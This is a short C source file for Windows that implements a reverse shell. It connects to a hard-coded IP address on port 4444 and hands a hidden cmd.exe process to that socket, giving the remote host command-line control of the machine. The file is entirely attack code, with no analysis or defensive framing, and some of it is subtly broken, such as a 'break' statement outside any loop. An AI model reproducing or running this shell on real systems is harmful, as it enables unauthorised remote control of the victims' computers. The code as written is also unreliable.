#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>

#define BUFSIZE 4096


int main()
{
    WSADATA WSAData;
    WSAStartup(MAKEWORD(2,0),&WSAData);
    SOCKET sock;
    SOCKADDR_IN s;
    s.sin_addr.s_addr = inet_addr("160.98.117.64");
    s.sin_family = AF_INET;
    s.sin_port = htons(4444);
    sock = WSASocket(AF_INET, SOCK_STREAM,IPPROTO_TCP,NULL,0,0);
    bind(sock, (SOCKADDR*)&s, sizeof(s));
    if(connect(sock, (SOCKADDR*)&s, sizeof(s))!=SOCKET_ERROR)
    {
        send(sock, "Shell opening on remote system...\n", 34, 0);
        PROCESS_INFORMATION pi;
        STARTUPINFO si;
        ZeroMemory(&si, sizeof(si));
        ZeroMemory(&pi, sizeof(pi));
        si.cb=sizeof(STARTUPINFO);
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.hStdError = (HANDLE)sock;
        si.hStdInput = (HANDLE)sock;
        si.hStdOutput = (HANDLE)sock;
        si.wShowWindow = SW_HIDE;
        CreateProcess(0,"cmd.exe",0,0,TRUE,0,0,0,&si,&pi);
        DWORD i=WaitForSingleObject(pi.hProcess,0xFFFFFFFF );
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        break;
    }
    closesocket(sock);
    WSACleanup();
    return 0;
}
